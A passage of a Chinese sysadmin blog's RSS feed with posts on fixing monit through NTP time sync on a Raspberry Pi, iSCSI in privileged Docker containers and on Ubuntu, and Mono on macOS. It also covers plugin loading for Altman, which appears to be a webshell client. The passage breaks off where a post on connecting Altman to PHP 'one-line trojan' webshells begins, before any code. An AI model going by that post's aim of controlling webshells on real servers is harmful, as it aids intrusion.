&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 设置开机同步时间，注意: 添加的代码必须在`exit 0`之前
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">echo &amp;#39;/usr/sbin/ntpdate 0.cn.pool.ntp.org&amp;#39; &amp;gt;&amp;gt; /etc/rc.local
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 设置同步任务，每隔5分钟同步一次时间
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 编辑crontab，并保存
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crontab -e
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*/5 * * * * /usr/sbin/ntpdate 0.cn.pool.ntp.org
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重启系统，系统时间已经正确了。&lt;/p>
&lt;p>在网页端对&lt;code>OMV&lt;/code>重新进行配置。WTF，怎么还是&lt;code>monit&lt;/code>这个问题！&lt;/p>
&lt;h2 id="豁然开朗">豁然开朗
&lt;/h2>&lt;p>登入终端，重新进行检查：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@raspberrypi:~# date
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dec &lt;span class="m">16&lt;/span> 11:12:04 CST &lt;span class="m">2015&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@raspberrypi:~# monit status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">monit: error connecting to the monit daemon
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>到这里时，我当时确实很疑惑，明明系统时间已经正确了，为什么&lt;code>monit&lt;/code>还是报错呢。&lt;/p>
&lt;p>突然灵光乍现，重新启动&lt;code>monit&lt;/code>服务，然后十几秒过后：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@raspberrypi:~# monit status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The Monit daemon 5.4 uptime: 18m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">System &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> status Running
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> monitoring status Monitored
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> load average &lt;span class="o">[&lt;/span>0.00&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>0.01&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>0.05&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cpu 0.0%us 0.1%sy 0.0%wa
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> memory usage &lt;span class="m">55424&lt;/span> kB &lt;span class="o">[&lt;/span>5.5%&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> swap usage &lt;span class="m">0&lt;/span> kB &lt;span class="o">[&lt;/span>0.0%&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> data collected &lt;span class="m">16&lt;/span> Dec &lt;span class="m">2015&lt;/span> 11:12:17
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="s1">&amp;#39;collectd&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> status Running
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> monitoring status Monitored
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pid &lt;span class="m">2535&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> parent pid &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uptime 18m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> children &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> memory kilobytes &lt;span class="m">4224&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> memory kilobytes total &lt;span class="m">4224&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> memory percent 0.4%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> memory percent total 0.4%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cpu percent 0.0%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cpu percent total 0.0%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> data collected &lt;span class="m">16&lt;/span> Dec &lt;span class="m">2015&lt;/span> 11:12:17
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在此个人分析，在&lt;code>monit&lt;/code>服务启动时，系统时间还未同步，所以&lt;code>monit&lt;/code>初始化失败。只要保证在时间同步后，再重启&lt;code>monit&lt;/code>服务应该就可以了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 在强制同步时间后，再重启monit服务
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">echo &amp;#39;/etc/init.d/monit restart&amp;#39; &amp;gt;&amp;gt; /etc/rc.local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重启系统，一切正常。END！&lt;/p>
&lt;h2 id="参考">参考
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/" target="_blank" rel="noopener"
>http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://forums.openmediavault.org/index.php/Thread/8770-RPi-2-RTC-module-from-unruly-Stepchild-to-Wunderkind/" target="_blank" rel="noopener"
>http://forums.openmediavault.org/index.php/Thread/8770-RPi-2-RTC-module-from-unruly-Stepchild-to-Wunderkind/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.raspberrypi.org/forums/viewtopic.php?f=91&amp;amp;t=83344" target="_blank" rel="noopener"
>https://www.raspberrypi.org/forums/viewtopic.php?f=91&amp;t=83344&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docker环境下使用open-iscsi遇到的问题</title><link>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</link><pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</guid><description>&lt;p>因为有业务需求，需要在docker的容器下连接iscsi磁盘。&lt;/p>
&lt;ul>
&lt;li>部署docker镜像，安装&lt;code>open-iscsi&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker pull ubuntu:14.04
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>进入容器，运行&lt;code>iscsiadm&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: can not connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: can not connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: Cann perform discovery. connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;p>初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。&lt;/p>
&lt;p>有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数&lt;code>privileged&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker &lt;span class="nb">help&lt;/span> run
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--privileged&lt;span class="o">=&lt;/span>&lt;span class="nb">false&lt;/span> Give extended privileges to this container
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;em>docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。&lt;/em>&lt;/p>
&lt;p>尝试一下：&lt;/p>
&lt;ul>
&lt;li>使用&lt;code>privileged&lt;/code>创建一个新的容器：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker run --privileged --name &lt;span class="nb">test&lt;/span> -t -i ubuntu:14.04 /bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>进入容器，运行&lt;code>iscsiadm&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>完美解决！END&lt;/p></description></item><item><title>Ubuntu14.04下连接ISCSI存储</title><link>https://www.keepwn.com/posts/howto-connect-iscsi-on-ubuntu/</link><pubDate>Tue, 10 Nov 2015 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/howto-connect-iscsi-on-ubuntu/</guid><description>&lt;h2 id="总体步骤">总体步骤
&lt;/h2>&lt;ul>
&lt;li>安装iscsi&lt;/li>
&lt;li>查找iscsi存储&lt;/li>
&lt;li>设置开机自动映射&lt;/li>
&lt;li>对映射的磁盘进行分区&lt;/li>
&lt;li>分区之后进行格式化&lt;/li>
&lt;li>设置开机自动加载分区&lt;/li>
&lt;/ul>
&lt;h2 id="配置过程">配置过程
&lt;/h2>&lt;p>1.安装程序open-iscsi&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ apt-get install open-iscsi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ service open-iscsi status
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;!-- more -->
&lt;p>2.查找iscsi存储&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ iscsiadm -m discovery -t sendtargets -p 192.168.1.10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>3.设置开机自动映射&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ iscsiadm -m node -T iqn.1997-05.com.test:iscsi1 -p 192.168.1.10:3260 --op update -n node.startup -v automatic
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>4.重新启动，检查是否成功映射&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ reboot
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ cat /proc/partitions
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现多出了一块设备&lt;code>/dev/sdb&lt;/code>&lt;/p>
&lt;p>5.对映射的磁盘进行分区&lt;/p>
&lt;p>如果小于2T分区，可以使用&lt;code>fdisk&lt;/code>进行分区，使用&lt;code>MBR&lt;/code>分区表，&lt;/p>
&lt;p>如果大于2T分区，则不能使用&lt;code>MBR&lt;/code>分区表，需要使用&lt;code>GPT&lt;/code>分区表。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ parted /dev/sdb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; print
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; mklabel gpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; mkpart primary 0% 100%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; print
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>6.分区之后进行格式化，格式化时硬盘分区太大，可以使用&lt;code>-T largefile&lt;/code>参数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ mkfs.ext4 -T largefile /dev/sdb1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>7.设置开机自动加载分区&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ e2label /dev/sdb1 /iscsi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test@ubuntu:~$ &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;LABEL=/iscsi /data ext4 _netdev 0 0&amp;#34;&lt;/span> &amp;gt;&amp;gt; /etc/fstab
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;em>PS&lt;/em>: &lt;code>_netdev&lt;/code>指的是，这个分区位于网络上，所以得等待网络启动完成后才会挂载该设备&lt;/p>
&lt;p>8.Done&lt;/p>
&lt;p>这样重启系统就可以自动挂载分区，使用跟本地磁盘一样。&lt;/p></description></item><item><title>Altman不能成功的加载插件</title><link>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</link><pubDate>Mon, 28 Jul 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</guid><description>&lt;p>一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。&lt;/p>
&lt;p>而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。&lt;/p>
&lt;p>今天早些时候，在stackoverflow看到之前有人提到过&lt;a class="link" href="http://stackoverflow.com/questions/5412086/mef-based-app-works-great-on-local-machine-but-doesnt-import-addins-when-run-f" target="_blank" rel="noopener"
>类似的问题&lt;/a>，恍然大悟。&lt;/p>
&lt;p>原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在&lt;a class="link" href="http://msdn.microsoft.com/en-us/library/dd409252%28VS.100%29.aspx" target="_blank" rel="noopener"
>这里&lt;/a>有详细的说明)&lt;/p>
&lt;p>所以，解决这个问题目前有三种方法：&lt;/p>
&lt;!-- more -->
&lt;ul>
&lt;li>手动修改Plugins目录下插件的文件属性。&lt;/li>
&lt;li>在程序根目录下添加Altman.exe.config，内容如下:
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">runtime&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">loadFromRemoteSources&lt;/span> &lt;span class="n">enabled&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="o">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">runtime&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>主程序将在下一个版本2.2.1中解决该问题。&lt;/li>
&lt;/ul></description></item><item><title>Mac安装mono环境</title><link>https://www.keepwn.com/posts/osx-installed-mono-environment/</link><pubDate>Fri, 25 Jul 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/osx-installed-mono-environment/</guid><description>&lt;h2 id="0x00准备工作">0x00准备工作
&lt;/h2>&lt;p>一个全新安装的MacOs X10.9系统&lt;/p>
&lt;h2 id="001下载mono和monodevelop并安装">0×01下载Mono和MonoDevelop并安装
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="http://download.mono-project.com/archive/3.4.0/macos-10-x86/MonoFramework-MDK-3.4.0.macos10.xamarin.x86.pkg" target="_blank" rel="noopener"
>MonoFramework-MDK-3.4.0.macos10.xamarin.x86.pkg&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://download.xamarin.com/studio/Mac/XamarinStudio-5.0.1.3-0.dmg" target="_blank" rel="noopener"
>XamarinStudio-5.0.1.3-0.dmg&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>然后默认安装即可。&lt;/p>
&lt;!-- more -->
&lt;h2 id="002验证mono是否安装正确">0×02验证Mono是否安装正确
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">TestAdeMac:~ testa$ mono -V
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mono JIT compiler version 3.4.0 ((no/d4511ef Tue Mar 25 14:35:52 EDT 2014)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TLS: normal
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SIGSEGV: altstack
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Notification: kqueue
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Architecture: x86
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Disabled: none
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Misc: softdebug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LLVM: yes(3.4svn-mono-(no/e656cac)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> GC: sgen
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装成功。&lt;/p></description></item><item><title>Altman连接phpEval与phpAssert一句话木马</title><link>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</link><pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</guid><description>&lt;p>之前测试altman工具的时候，遇到了一个问题，现解决方法如下：&lt;/p>
&lt;p>Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
